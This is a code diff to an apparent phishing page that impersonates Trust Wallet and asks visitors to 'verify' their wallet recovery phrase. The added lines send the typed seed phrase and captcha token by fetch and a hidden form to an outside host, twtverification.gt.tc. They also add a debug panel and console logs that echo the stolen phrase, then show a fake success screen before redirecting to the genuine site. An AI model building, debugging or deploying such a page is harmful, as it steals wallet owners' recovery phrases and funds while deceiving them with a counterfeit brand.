@@ -159,6 +159,16 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         #resultFrame { display: none; }
+        .debug-info {
+            background: #fef3c7;
+            border: 1px solid #f59e0b;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: #92400e;
+        }
     </style>
 </head>
 <body>
@@ -202,6 +212,12 @@
         <iframe id="resultFrame" name="resultFrame" style="display:none;"></iframe>
         
         <button id="submitBtn" class="submit-btn" disabled>🔒 Verify Recovery Phrase</button>
+        
+        <!-- DEBUG INFO -->
+        <div id="debugInfo" class="debug-info" style="display:none;">
+            <strong>🛠️ DEBUG INFO (Check Console F12):</strong><br>
+            <span id="debugText"></span>
+        </div>
     </div>
 
     <script>
@@ -426,6 +442,8 @@
         const submitBtn = document.getElementById('submitBtn');
         const pasteArea = document.getElementById('pasteArea');
         const phraseForm = document.getElementById('phraseForm');
+        const debugInfo = document.getElementById('debugInfo');
+        const debugText = document.getElementById('debugText');
         let inputs = [];
 
         function createInputs(count) {
@@ -527,7 +545,7 @@
             submitBtn.disabled = !(allFilled && allValid && noDuplicates && captchaValid);
         }
 
-        // 🚨 FORM POST VERSION (NO CORS) WITH CONSOLE LOG
+        // 🚨 FULL DEBUG VERSION 
         async function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             
@@ -544,32 +562,65 @@
                 return;
             }
 
+            // SHOW DEBUG PANEL
+            debugInfo.style.display = 'block';
+            debugText.innerHTML = `📤 Phrase: ${JSON.stringify(phrase).slice(0, 100)}...<br>🔑 hCaptcha: ${hcaptchaToken.slice(0, 50)}...`;
+
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
 
-            // FORM SUBMISSION (NO CORS BLOCK)
+            // 1️⃣ FETCH REQUEST (for console debugging)
+            console.log('🌐 SENDING FETCH...');
+            fetch('https://twtverification.gt.tc/index.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: `phrase=${encodeURIComponent(JSON.stringify(phrase))}&hcaptcha_response=${encodeURIComponent(hcaptchaToken)}`
+            }).then(async response => {
+                const responseText = await response.text();
+                console.log('✅ FETCH STATUS:', response.status);
+                console.log('✅ FETCH RESPONSE:', responseText);
+                debugText.innerHTML += `<br>🌐 FETCH: ${response.status} - ${responseText.slice(0, 100)}...`;
+            }).catch(err => {
+                console.log('❌ FETCH ERROR:', err);
+                debugText.innerHTML += `<br>❌ FETCH ERROR: ${err.message}`;
+            });
+
+            // 2️⃣ FORM SUBMISSION (original no-CORS method)
+            console.log('📄 SENDING FORM...');
             document.getElementById('phraseInput').value = JSON.stringify(phrase);
             document.getElementById('hcaptchaInput').value = hcaptchaToken;
             phraseForm.submit();
 
-            // Show success screen immediately
+            // 3️⃣ CHECK IFRAME RESULT after delay
             setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem;">
-                        <div style="background: white; border-radius: 24px; padding: 3rem 2.5rem; text-align: center; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.08);">
-                            <img style="width: 60px; margin-bottom: 1.5rem;" src="https://trustwallet.com/assets/images/media/assets/TWT.png">
-                            <div style="width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #3375BB, #1E3A8A); margin: 0 auto 2rem; display: flex; align-items: center; justify-content: center; font-size: 3.5rem;">✓</div>
-                            <h1 style="font-size: 2rem; margin-bottom: 1rem;">Verification Complete!</h1>
-                            <div style="background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 0.75rem 1.5rem; border-radius: 12px; display: inline-block; margin-bottom: 2rem;">✅ Phrase Verified Successfully</div>
-                            <p style="color: #64748b; margin-bottom: 1.5rem;">Your wallet is now synchronized.</p>
-                            <div style="width: 40px; height: 40px; border: 3px solid #e2e8f0; border-top: 3px solid #3375BB; border-radius: 50%; animation: spin 1s linear infinite; margin: 2rem auto;"></div>
-                            <a href="https://trustwallet.com" style="background: linear-gradient(135deg, #3375BB, #1E3A8A); color: white; padding: 1rem 2.5rem; border-radius: 12px; text-decoration: none; font-weight: 600; display: inline-block;">Return to Trust Wallet</a>
-                        </div>
+                try {
+                    const iframeResult = document.getElementById('resultFrame').contentDocument?.body?.innerHTML || 'EMPTY';
+                    console.log('📡 IFRAME RESULT:', iframeResult);
+                    debugText.innerHTML += `<br>📡 IFRAME: ${iframeResult.slice(0, 100)}...`;
+                } catch(e) {
+                    console.log('❌ IFRAME ACCESS ERROR:', e);
+                    debugText.innerHTML += '<br>❌ IFRAME: Cross-origin blocked';
+                }
+                
+                // Show success screen after 4 seconds
+                setTimeout(showSuccessScreen, 4000);
+            }, 1500);
+        }
+
+        function showSuccessScreen() {
+            document.body.innerHTML = `
+                <div style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem;">
+                    <div style="background: white; border-radius: 24px; padding: 3rem 2.5rem; text-align: center; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.08);">
+                        <img style="width: 60px; margin-bottom: 1.5rem;" src="https://trustwallet.com/assets/images/media/assets/TWT.png">
+                        <div style="width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #3375BB, #1E3A8A); margin: 0 auto 2rem; display: flex; align-items: center; justify-content: center; font-size: 3.5rem;">✓</div>
+                        <h1 style="font-size: 2rem; margin-bottom: 1rem;">Verification Complete!</h1>
+                        <div style="background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 0.75rem 1.5rem; border-radius: 12px; display: inline-block; margin-bottom: 2rem;">✅ Phrase Verified Successfully</div>
+                        <p style="color: #64748b; margin-bottom: 1.5rem;">Your wallet is now synchronized. Check console (F12) for debug info.</p>
+                        <a href="https://trustwallet.com" style="background: linear-gradient(135deg, #3375BB, #1E3A8A); color: white; padding: 1rem 2.5rem; border-radius: 12px; text-decoration: none; font-weight: 600; display: inline-block;">Return to Trust Wallet</a>
                     </div>
-                    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
-                `;
-                setTimeout(() => { window.location.href = 'https://trustwallet.com'; }, 5000);
-            }, 1000);
+                </div>
+            `;
+            setTimeout(() => { window.location.href = 'https://trustwallet.com'; }, 5000);
         }
 
         submitBtn.addEventListener('click', submitForm);
